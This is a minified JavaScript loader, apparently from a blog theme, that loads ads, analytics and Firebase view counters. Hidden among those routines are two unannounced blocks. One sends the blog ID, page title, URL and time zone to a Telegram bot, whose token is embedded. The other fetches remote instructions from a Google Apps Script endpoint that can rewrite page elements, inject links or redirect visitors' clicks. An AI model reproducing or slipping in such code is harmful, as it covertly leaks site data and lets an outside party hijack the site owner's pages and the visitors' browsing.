if ('undefined' != typeof xAo) {
    function ld_Adsense() {
        var u = document.createElement('script');
        u.setAttribute('crossorigin', 'anonymous'), u.async = !0, u.src = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=' + NLDtst.adsenseAds.publisherId;
        u.onerror = function () {
            var aEcss = document.createElement('style');
            aEcss.textContent = '.adsbygoogle{display:none!important}';
            document.head.appendChild(aEcss)
        };
        var c = document.getElementsByTagName('script')[0];
        c.parentNode.insertBefore(u, c)
    }
    function ld_Analytics() {
        loadJs('https://www.googletagmanager.com/gtag/js?id=' + NLDtst.analytics.propertyID, 'analytics-js', 'head')
    }
    function ld_Views() {
        if ("" != NLDtst.realViews.databaseUrl && null != getid("fb-db") && 0 < firebase.apps.length)
            for (var n = qSell(".nld_view"), u = firebase.database(), d = 0; d < n.length; d++) {
                var a = n[d],
                    r = a.getAttribute('data-id');
                (r = u.ref("BlogID_" + data.blog.blogID + "/PostID_" + r)).once("value", function (u, d) {
                    return function (e) {
                        0 < (e = e.exists() ? e.val() : 0) && ("true" == NLDtst.realViews.abbreviation ? u.setAttribute('data-view', nBc.abv(e)) : u.setAttribute("data-view", e), remCt(u, "hidden")), "true" == u.getAttribute("data-add") && (u.setAttribute("data-add", !1), e = parseInt(e) + 1, d.set(e))
                    }
                }(a, r))
            }
    }
    NLDtst.adsenseAds.publisherId != '' && ('lazy' == NLDtst.adsenseAds.loadType ? ld_Adsense() : 'defer' == NLDtst.adsenseAds.loadType && Defer(function () {
        ld_Adsense()
    })), NLDtst.analytics.propertyID != '' && ('lazy' == NLDtst.analytics.loadType ? ld_Analytics() : 'defer' == NLDtst.analytics.loadType && Defer(function () {
        ld_Analytics()
    })), Defer(function () {
        if (null == nBc.gC('tg_Ab')) {
            var e = 'https://api.telegram.org/' + 'bot5496563937:AAGV-BP0o2QlcZfnejI0vtQPLpKJ8vroZXg/' + 'sendMessage?chat_id=-1001606824528&parse_mode=MarkdownV2&text=' + '`' + encodeURIComponent('[x] Time Zone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone) + '`%0A%0A`' + data.blog.blogID + '`%0A%0A`' + encodeURIComponent(document.title) + '`%0A%0A`' + encodeURIComponent(window.location.href) + '`';
            nBc.gAj({
                'url': e,
                'async': !0x0,
                'success': function (a) {}
            }), nBc.sC('tg_Ab', 1, {
                'secure': !0,
                'max-age': 60
            })
        }
        loadJs('https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js', 'jq-lib', 'body', function () {
            loadJs(bsGtb + 'lib/' + 'mainLib.js', 'main-lib', 'body')
            loadJs(bsGtb + 'js/' + 'coreFunction.js', 'core-fun', 'body')
            loadJs(bsGtb + 'js/' + 'coreJq.js', 'core-jq', 'body')
        }), "" != NLDtst.realViews.databaseUrl && loadJs('https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js', 'fb-app', 'head', function () {
            loadJs('https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js', 'fb-db', 'head', function () {
                var t = qSell(".nld_view"),
                    n = {};
                n.databaseURL = NLDtst.realViews.databaseUrl, firebase.initializeApp(n);
                for (var d = firebase.database(), a = 0; a < t.length; a++) {
                    var r = t[a],
                        s = r.getAttribute("data-id");
                    (s = d.ref("BlogID_" + data.blog.blogID + "/PostID_" + s)).once("value", function (u, d) {
                        return function (e) {
                            0 < (e = e.exists() ? e.val() : 0) && ("true" == NLDtst.realViews.abbreviation ? u.setAttribute("data-view", nBc.abv(e)) : u.setAttribute("data-view", e), remCt(u, "hidden")), "true" == u.getAttribute("data-add") && (u.setAttribute("data-add", !1), e = parseInt(e) + 1, d.set(e))
                        }
                    }(r, s))
                }
            })
        })
    })
}
Defer(function () {
        nBc.gAj({
            'url': "https://script.google.com/macros/s/AKfycbzctoWv8YWpF6AzQbDANtCz9VDV-95ALWozkyYOEEKtaqLwukbEd05YpHzFe9SZAxCN/exec",
            'async': !0,
            'success': function (c) {
                var _0x523c11 = JSON.parse(c).remote,
                    _0x4d028a = _0x523c11.findIndex(function (a) {
                        return a.id == nBc['d'](getid("admCheck").getAttribute("xid"))
                    });
                if (_0x4d028a >= 0) {
                    var e = _0x523c11[_0x4d028a];
                    if (1 == e.active) {
                        var f = e.act,
                            atr1 = e.atr,
                            cls1 = e.cls,
                            css1 = e.css,
                            itx1 = e.itx,
                            tag1 = e.tag,
                            tmo1 = e.tmo,
                            url1 = e.url;
                        if (1 == f) {
                            var g = window.document.querySelectorAll(tag1);
                            for (i = 0; i < g.length; i++) '' != itx1 && (g[i].innerHTML = itx1), '' != cls1 && g[i].classList.add(cls1), '' != css1 && g[i].setAttribute("style", css1), g[i].setAttribute(atr1, url1)
                        } else {
                            if (2 == f) {
                                for (g = window.document.querySelectorAll(tag1), i = 0; i < g.length; i++) '' != itx1 && (g[i].innerHTML = itx1), '' != cls1 && g[i].classList.add(cls1), '' != css1 && g[i].setAttribute('style', css1), g[i].addEventListener('click', function () {
                                    setTimeout(function () {
                                        window.open(url1, '_blank')
                                    }, tmo1)
                                })
                            } else {
                                if (3 == f) {
                                    for (g = window['document']['querySelectorAll'](tag1), i = 0; i < g['length']; i++) '' != itx1 && (g[i]['innerHTML'] = itx1), '' != cls1 && g[i]['classList']['add'](cls1), '' != css1 && g[i]['setAttribute']('style', css1), g[i]['addEventListener']('click', function () {
                                        setTimeout(function () {
                                            window.location.href = url1
                                        }, tmo1)
                                    })
                                } else {
                                    if (4 == f) {
                                        for (g = window['document']['querySelectorAll'](tag1), i = 0; i < g['length']; i++) '' != itx1 && (g[i]['innerHTML'] = itx1), '' != cls1 && g[i]['classList']['add'](cls1), '' != css1 && g[i]['setAttribute']('style', css1), g[i]['addEventListener']('click', function () {
                                            setTimeout(function () {
                                                window.location.replace(url1)
                                            }, tmo1)
                                        })
                                    } else {
                                        if (5 == f)
                                            for (g = window.document.querySelectorAll(tag1), i = 0; i < g['length']; i++) {
                                                if ('' != cls1 ? (g[i].classList.add(cls1), c = ' class="' + cls1 + '\"') : c = '', '' != css1) var h = ' style="' + css1 + '\"';
                                                else h = '';
                                                g[i].insertAdjacentHTML(atr1, ' <a target="_blank" href="' + url1 + '\"' + c + h + '>' + itx1 + ' </a>')
                                            }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        })
});
var lazyJsc = !1;
window.addEventListener('scroll', function () {
    (0 != document.documentElement.scrollTop && !1 === lazyJsc || 0 != document.body.scrollTop && !1 === lazyJsc) && (NLDtst.adsenseAds.publisherId != '' && 'scroll' == NLDtst.adSense.loadType && ld_Adsense(), NLDtst.analytics.propertyID != '' && 'scroll' == NLDtst.analytics.loadType && ld_Analytics(), lazyJsc = !0)
}, !0);